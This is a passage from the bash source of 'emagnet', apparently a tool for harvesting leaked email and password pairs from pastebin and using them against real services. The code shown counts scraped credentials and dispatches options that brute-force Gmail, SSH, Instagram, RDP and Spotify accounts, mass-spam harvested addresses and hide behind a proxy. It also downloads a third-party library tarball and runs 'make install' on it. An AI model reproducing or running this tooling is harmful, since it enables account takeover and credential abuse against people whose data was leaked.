  echo -e "Whitelist your ip at: https://pastebin.com/doc_scraping_api\n"
  echo -e "API has been set to false and emagnet will not be able to scrape"
  echo -e "pastebin until you added your IP, using pastebin.com/archive until then\n "
  secs=10
  shift
  msg=$@
  while [ $secs -gt 0 ]
  do
             printf "\r\033[KContinues in %.d seconds $msg..." $((secs--))
    sleep 1
  done
  echo
fi
}

###############################################################################
#### This is stats function when you using emagnet -s for count stats.......####
################################################################################
emagnet_stats() {
   emagnet_clear;emagnet_banner;emagnet_conf
   printf "Please wait..."
   TOTALFILES=$(ls $EMAGNETARCHIVE/all-files | wc -l)
   TEMAILFILES=$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETARCHIVE/all-files | cut -d: -f1|uniq|sort| wc -l)
   TPASSWORDFILES=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETARCHIVE/all-files|awk '{print $1}'|cut -d: -f1|uniq|grep -v '"'\|','\|'<'\|'>'|uniq|sort|wc -l)
   TEMAILS=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" $EMAGNETARCHIVE/all-files|awk -F, '!seen[$1]++'|wc -l)
   TPASSWORDS=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETARCHIVE/all-files|awk -F, '!seen[$1]++'|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v ' '\|'/'\|'"'\|','\|'<'\|'>'|wc -l)
   emagnet_clear; emagnet_banner;
   printf '+ Please wait, counting data                              [\e[1;32mDONE\e[0m]'
   sleep 1;emagnet_clear;emagnet_banner;
   printf "%23s EMAGNET STATS\n\n"

for tpasswordsfiles in "$TPASSWORDFILES"; do
  if [[ $TPASSWORDFILES -lt "10" ]]; then
    printf "Total Files That Includes Atleast 1 Password"; printf "%s%s%11s[\e[1;31m0$TPASSWORDFILES%10d\e[0m]\n"|tr ' ' '.'
  else
    printf "Total Files That Includes Atleast 1 Password"; printf "s%s%11s[\e[1;32m$TPASSWORDFILES\e[0m]\n"|tr ' ' '.'
 fi
done

for temailfiles in "$TEMAILFILES"; do
  if [[ $TEMAILFILES -lt "10" ]]; then
    printf "Total Files That Includes Atleast 1 Mail Address";printf "%s%s%8s[\e[1;31m00\e[0m]\n"|tr ' ' '.'
else
    printf "Total Files That Includes Atleast 1 Mail Address";printf "%s%s%8s[\e[1;32m$TEMAILFILES\e[0m]\n"|tr ' ' '.'
  fi
done

for totalfiles in "$TOTALFILES"; do
  if [[ $TOTALFILES -lt "10" ]]; then
    printf "Total Files"; printf "%s%s%45s[\e[1;31m0$TOTALFILES\e[0m]\n"|tr ' ' '.'
  else
    printf "Total Files"; printf "%s%s%45s[\e[1;32m$TOTALFILES\e[0m]\n"|tr ' ' '.'
  fi
done

for temails in "$TEMAILS"; do
  if [[ $TEMAILS -lt "10" ]]; then
    printf "Total Mail Addresses Stored"; printf "%s%s%29s[\e[1;31m0$TEMAILS\e[0m]\n"|tr ' ' '.'
  else
    printf "Total Mail Addresses Stored"; printf "%s%s%29s[\e[1;32m$TEMAILS\e[0m]\n"|tr ' ' '.'
  fi
done

for tpasswords in "$TPASSWORDS"; do
  if [[ $TPASSWORDS -lt "10" ]]; then
    printf "Total Passwords Stored"; printf "%s%s%s%34s[\e[1;31m0$TPASSWORDS\e[0m]\n\n"|tr ' ' '.'
  else
    printf "Total Passwords Stored"; printf "%s%s%34s[\e[1;32m$TPASSWORDS\e[0m]\n\n"|tr ' ' '.'
  fi
done
}

emagnet_distro() {
emagnet_conf
    if [[ -z $DISTRO ]]; then
        DISTRO="$(cat /etc/*release | head -n 1 | awk '{ print tolower($1) }' | cut -d= -f2)"
        sed -i "s/DISTRO=/DISTRO=$DISTRO/g" $CONF
    fi
}


case "${1}" in
     "-a"|"-author"|"--author")
          emagnet_author
     ;;

     "-A"|"-api"|"--api")
         emagnet_required_stuff
         emagnet_conf
       if [[ $2 = "true" ]]; then
          sed -i 's/API=false/API=true/g' $CONF
          echo -e "$basename$0: config file has been update -- API has been set to true"
       elif [[ $2 = "false" ]]; then 
          sed -i 's/API=false/API=false/g' $CONF
          sed -i 's/API=true/API=false/g' $CONF
          echo -e "$basename$0: config file has been updated -- API has been set to false"
       else 
          echo -e "$basename$0: internal error -- API requires a value to be used (true/false)"
       fi
     ;;

     "-B"|"--banned"|"--blocked")
          emagnet_wasibanned
      ;;

     "emagnet"|"-e"|"-emagnet"|"--emagnet")
        emagnet_conf           # Source emagnet.conf before we do anything else so we know variables are used, like user-agent before check_pastebin
        emagnet_check_pastebin # Check if everything ARE ok and if we are allowed to visit pastebin before we doing anything
        emagnet_iconnection
        emagnet_first_run
        emagnet_required_tools
        emagnet_distro
        sed -i 's/GBRUTEFORCE=true/GBRUTEFORCE=false/g' "$CONF"
        sed -i 's/SBRUTEFORCE=true/SBRUTEFORCE=false/g' "$CONF"
        sed -i 's/PBRUTEFORCE=true/PBRUTEFORCE=false/g' "$CONF"
        sed -i 's/IBRUTEFORCE=true/IBRUTEFORCE=false/g' "$CONF"
        sed -i 's/RBRUTEFORCE=true/RBRUTEFORCE=false/g' "$CONF"
        emagnet_run4ever
      ;;
      "-S"|"-search"|"--search")
           emagnet_conf
           emagnet_search
        ;;

      "-g"|"-bruteforce"|"--bruteforce")
          emagnet_required_tools
          emagnet_iconnection
          emagnet_first_run

          sed -i 's/GBRUTEFORCE=true/GBRUTEFORCE=false/g' "$CONF"
          sed -i 's/SBRUTEFORCE=true/SBRUTEFORCE=false/g' "$CONF"
          sed -i 's/PBRUTEFORCE=true/PBRUTEFORCE=false/g' "$CONF"
          sed -i 's/IBRUTEFORCE=true/IBRUTEFORCE=false/g' "$CONF"
          sed -i 's/RBRUTEFORCE=true/RBRUTEFORCE=false/g' "$CONF"

          if [[ "$2" = "gmail" ]]; then
            sed -i 's/GBRUTEFORCE=false/GBRUTEFORCE=true/g' "$CONF"
            emagnet_conf
              if [[ "$GBRUTEFORCE" = "true" ]]; then
               emagnet_run4ever
               emagnet_gmail_bruter
               mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
          fi

           elif [[ "$2" = "ssh" ]]; then
           sed -i 's/SBRUTEFORCE=false/SBRUTEFORCE=true/g' "$CONF"
           emagnet_conf
              if [[ "$SBRUTEFORCE" = "true" ]]; then
               emagnet_run4ever
               emagnet_sshbruter
               mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
              fi

           elif [[ "$2" = "instagram" ]]; then
           sed -i 's/IBRUTEFORCE=false/IBRUTEFORCE=true/g' "$CONF"
               emagnet_conf
              if [[ "$IBRUTEFORCE" = "true" ]]; then
               emagnet_run4ever
               emagnet_instagrambruter
               mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
              fi

           elif [[ "$2" = "rdp" ]]; then
           sed -i 's/RBRUTEFORCE=false/RBRUTEFORCE=true/g' "$CONF"
           emagnet_conf
              if [[ "$RBRUTEFORCE" = "true" ]]; then
               emagnet_run4ever
               emagnet_rdpbruter
               mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
              fi

           elif [[ "$2" = "spotify" ]]; then
             find /usr/include -name "portaudio.h" |xargs grep -v "port" &> /dev/null
               if [[ $? -ne 0 ]]; then 
                   # DEBIAN DISTROS: ALSA Development Kit Before PortAudio 
                   # DEBIAN DISTROS: Copy and paste: apt install libsound-dev libasound-dev portaudio19-dev libportaudio2 libportaudiocpp0
                   # GENTOO DISTROS: wich is the default distro for emagnet, of course have it already in tree, 
                   # GENTOO DISTROS: emerge --ask media-libs/portaudio
                    echo -e "$basename$0: internal error -- portaudio is required to be installed, exiting..."
                    exit 1
               fi

if [[ "$LIBSPOTIFY" = "false" ]]; then
   find /usr/include -type d |grep 'libspotify' &> /dev/null
     if [[ "$?" -ne "0" ]]; then

echo -e "
\e[1;33mNOTICE:\e[0m
-------------------------------------------
\e[1;32mlibspotify\e[0m is not installed on this system
and since it is deprecated it is removed from 
all current repositorys for all distros so you
you need to install it manually, see below:

\e[1;34mMANUALLY INSTALL:\e[0m
-------------------------------------------
wget https://nr1.nu/archive/\e[1;32mlibspotify\e[0m/12.1.51/amd64/\e[1;32mlibspotify\e[0m_12.1.51.orig-amd64.tar.gz -P /tmp
tar -xvf /tmp/\e[1;32mlibspotify\e[0m_12.1.51.orig-amd64.tar.gz -C /tmp
cd /tmp/\e[1;32mlibspotify\e[0m-12.1.51-Linux-x86_64-release/ && make install prefix=/usr/local

\e[1;31mALSA Development Kit Requirements:\e[0m
-------------------------------------------
If you don't care or understand what this is about
then you probably just want type uppercase \e[4mYES\e[0m
to let me install \e[1;32mlibspotify\e[0m and get started :)\n
"

read -p "Answer: " LIBSPOTIFY
if [[ "$LIBSPOTIFY" = "YES" ]]; then
printf "%s" "Checking connection........";emagnet_iconnection
    ping -i "1" -c 1 google.com &> /dev/null; [[ "$?" -gt "0" ]] && echo -e "$basename$0: internal error -- this feature require a inernet connection but you seems to be offline, exiting.."
printf "..ok\n"
sleep 1
printf "%s" "Downloading libspoify........"; wget -q https://nr1.nu/archive/libspotify/12.1.51/amd64/libspotify_12.1.51.orig-amd64.tar.gz -P /tmp; printf "ok\n"
printf "%s" "Extracting libspoify..,......"; tar -xf /tmp/libspotify_12.1.51.orig-amd64.tar.gz -C /tmp; printf "ok\n"
printf "%s" "Installing libspotify........"; cd /tmp/libspotify-12.1.51-Linux-x86_64-release/&> /dev/null; printf "ok\n"  & make install prefix=/usr/local &> /dev/null; printf "ok\n"
#printf "%s" "Installing libspotify........"; cd /tmp/libspotify-12.1.51-Linux-x86_64-release/  & make install prefix=/usr/local &> /dev/null; printf "ok\n"
printf "%s" "Preparing emagnet.conf......."; emagnet_conf;sed -i '248d' "$CONF";sed -i '248 i LIBSPOTIFY=true' "$CONF"; printf "ok\n"
echo -e "\nAll done, will continue in 3 seconds!"
sleep 2
else
  echo "Can't continue until libspotify has been installed.."
  echo "Exiting.."
  exit 1
  sed -i '248d' "$CONF"
  sed -i '248 i LIBSPOTIFY=false' "$CONF"
fi
fi
              else
               sed -i '248d' "$CONF"
               sed -i '248 i LIBSPOTIFY=true' "$CONF"
            fi
               hash unzip &> /dev/null
               if [[ "$?" -ne "0" ]]; then
                echo -e "$basename$0: internal error -- unzip is required to be installed for unzip sconsify ..."
                exit 1
              fi
                    ./sconsify -version &> /dev/null
                        if [[ "$?" -ne "0" ]]; then
                         echo "Sconsify is required to be installed before we attacking targets.."
                           read -p "Download and install sconsify (y/N): " installsconsify
                             if [[ "$installsconsify" -eq "y" ]]; then
                              echo -e "Hold on, downloading sconsify.."
                              wget -q --user-agent="${USERAGENT}" "https://github.com/fabiofalci/sconsify/releases/download/next-20180428/linux-x86_64-sconsify-0.6.0-next.zip"
                              echo -e "Unzipping sconsify into current dir.."
                              unzip -q -o "linux-x86_64-sconsify-0.6.0-next.zip"
                              chmod +x ./sconsify
                              echo -e "Cleaning up..."
                              rm "linux-x86_64-sconsify-0.6.0-next.zip"
                              echo "All done, have fun!"
                              sleep 2
                             else
                              echo -e "$basename$0: internal error -- sconsify is required to be installed.."
                              exit 1
                         fi
                        fi
                     sed -i 's/PBRUTEFORCE=false/PBRUTEFORCE=true/g' "$CONF"
                  emagnet_conf

                 if [[ "$PBRUTEFORCE" = "true" ]]; then
                                emagnet_clear
                                emagnet_banner
                                printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
                                printf "\n%64s \n\n" | tr ' ' '='
                                emagnet_run4ever
                                printf "\n%64s \n\n" | tr ' ' '='
                                emagnet_spotify_bruter
                 fi
                                mv "$EMAGNETTEMP/*" "$EMAGNETHOME/all-files" &> /dev/null
                else
                       printf "%s\n" "$basename$0: internal error -- not a valid option, try gmail, spotify or ssh"
                       exit 1
                fi
                ;;
      "-k"|"-kill"|"--kill")
                emagnet_kill
                ;;

      "-i"|"--ip"|"-ip"|"ip")
                emagnet_required_tools
                emagnet_conf
                emagnet_iconnection
                echo "The IP You will use when visiting pastbin:"
                if [[ $PROXY = "true" ]]; then
                CURL="curl -s -x socks5h://$PROXYHOST:$PROXYPORT ";
                else
                CURL="curl -s "
                fi
                echo -e "IP : $($CURL -s $WIP)"
                ;;

      "-h"|"--help"|"-help"|"help")
                emagnet_usage
                ;;

      "-l"|"-license"|"--license")
                emagnet_required_tools
                emagnet_iconnection
                emagnet_license
                ;;

      "-m"|"-merge"|"--merge")
                emagnet_required_stuff
                emagnet_conf
                emagnet_merge
                ;;

      "-M"|"-move"|"--move")
                emagnet_required_stuff
                emagnet_conf
                emagnet_move_files
                ;;

      "-s"|"-spam"|"--spam")
               emagnet_required_stuff
               emagnet_conf 
               if [[ -z "$EMAIL2SEND" ]]; then
                 if ! [[ -f "$2" ]]; then
                   echo -e "$basename$0: internal error -- no such file found"
                   exit 1
                 fi
                fi

                if [[ -n "$2" ]]; then
                    sed -i '140d' "${CONF}"; sed -i "140 i EMAIL2SEND=$2" "${CONF}"
                    echo -e "$basename$0: config file has been updated -- text file has been set to: $2"
                    exit 1
                fi
                emagnet_required_tools
                emagnet_iconnection
                emagnet_first_run
                emagnet_spammer
                ;;
      "-d"|"-stats"|"--stats")
                emagnet_required_stuff
                emagnet_conf
                emagnet_stats
                ;;

      "-x"|"-syntax"|"--syntax")
                emagnet_required_tools
                emagnet_conf
                emagnet_iconnection
                SYNTAX2DL="${2}"
                emagnet_syntax
                ;;

      "-q"|"-quiet"|"--quiet")
                emagnet_conf
                emagnet_screen
                ;;

      "version"|"-version"|"--version"|"-V")
                emagnet_required_stuff
                emagnet_conf
                VERSION="$(cat $CONF|grep "^VERSION"|cut -d= -f2)"
                printf "Emagnet Version: $VERSION\n"
                ;;

      "-t"|"-time"|"--time")
                emagnet_required_stuff;emagnet_conf
                if [[ -z "$2" ]]; then echo "emagnet: internal error -- time require a number to be used";exit 1;fi
                re='^[0-9]+$';if ! [[ $2 =~ $re ]]; then  echo -e "emagnet: internal error -- that's not a valid number" >&2;exit 1; fi
                sed -i '30d' "$CONF";sed -i "30 i TIME=$2" "$CONF"
                printf "%s\n" "$basename$0: config file has been updated -- time has been set to: $2 seconds"
                exit 1
                ;;

        "-n"|"-notify"|"--notify")
            emagnet_required_stuff
            emagnet_conf
            which "notify-send" &> /dev/null
                if [[ "$?" -gt "0" ]]; then echo -e "$basename$0: internal error -- notify-send is required to be installed";exit 1; fi
                if [[ "$2" != "true" && "$2" != "false" || -z "$2" ]]; then echo -e "$basename$0: internal error -- you must use true or false";exit 1;fi
                if ! [[ "$NOTIFY" -eq "truee" ]]; then
                   notify-send "Emagnet" '\n[00] - This is a test\n[00] - If you see this\n[00] - Press Any Key'
                     echo -e "\rIf you see the notification, hit any key.\c"
                     read -t 5 notifyworks
                       if [[ ! -z "$yepitworks" ]] ; then
                          echo -e "\nOk, seems not, you probably must export your display then.."
                          exit 1
                       else
                          echo -e "\n$basename$0: config file has been updated -- notifications has been enable"
                          sed -i '150d' "$CONF";sed -i "150 i NOTIFY=truee"  "$CONF";printf "$basename$0: config file has been updated -- notifications has been enable\n"
                          exit 1
                       fi
                  fi
                # Since user already has answered if notifications works once, we set notify to truee instead of true so we know
                if [[ $2 = "true" ]];  then sed -i '149d' "$CONF";sed -i "149 i NOTIFY=truee"  "$CONF";printf "$basename$0: config file has been updated -- notifications has been enable\n"; fi
                if [[ $2 = "false" ]]; then sed -i '149d' "$CONF";sed -i "149 i NOTIFY=false" "$CONF";printf "$basename$0: config file has been updated -- notifications has been disable\n";fi
                ;;

        "-b"|"-backup"|"--backup")
            emagnet_required_stuff
            emagnet_conf
            [[ -d "$EMAGNETBACKUP" ]] && mkdir -p "$EMAGNETBACKUP"
                if [[ "$2" = "all" ]]; then
                   printf "%s" "Creating a tar archive of $EMAGNET"
                   pigz -h &> /dev/null
                   if [[ "$?" -ne "0" ]]; then
                       TAR="tar cf - --absolute-names $EMAGNET" 
                   else
                       TAR="tar -cf - --absolute-names $EMAGNET | pigz -0 -p $THREADS --fast"
                   fi
                   $TAR > "$EMAGNETBACKUP/emagnet-${2}-$(date +%d%m%Y).tar.gz"
                   printf "..Done..\nBackup: $EMAGNETBACKUP/emagnet-${2}-$(date +%d%m%Y).tar.gz\n"
                   exit 1
                 elif [[ "$2" = "archive" || "$2" = "incoming" ]]; then
                   printf '%s' "Creating a tar archive of $EMAGNET/${2}"
                   pigz -h &> /dev/null
                   [[ "$?" -ne "0" ]] && TAR="tar cf - --absolute-names $EMAGNET/$2" || TAR="tar -cf --absolute-names - $EMAGNET/$2 | pigz -0 -p $THREADS --fast"
                   $TAR > "$EMAGNETBACKUP/emagnet-${2}-$(date +%d%m%Y).tar.gz"
                   printf "..Done..\nBackup: $EMAGNETBACKUP/emagnet-${2}-$(date +%d%m%Y).tar.gz\n"
                   exit 1
                 else
                  echo -e "$basename$0: internal error -- you must choose one of: incoming, archive or all"
                  exit 1
                fi
                ;;
         "-p"|"--proxy"|"--p")
              emagnet_required_stuff
              if [[ "$2" = "true" ]]; then
                 sed -i 's/PROXY=false/PROXY=true/g' $CONF
                 echo -e "$basename$0: config file has been updated -- proxy has been enable"
               elif [[ "$2" = "false" ]]; then
             
                sed -i 's/PROXY=true/PROXY=false/g' $CONF
                 echo -e "$basename$0: config file has been updated -- proxy has been disabled"
               else
                 echo -e "$basename$0: internal error -- you must set proxy to true or false"
                 exit 1
              fi
               ;;
      
    "\?")
              printf "emagnet: internal error -- use --help for available commands'\n\n"
              exit 1 ;;
       "*")
              printf "emagnet: internal error -- use --help for available commands'\n\n"
              exit 1 ;;

esac

( [[ -z $1 ]] && emagnet_usage; exit 1 )
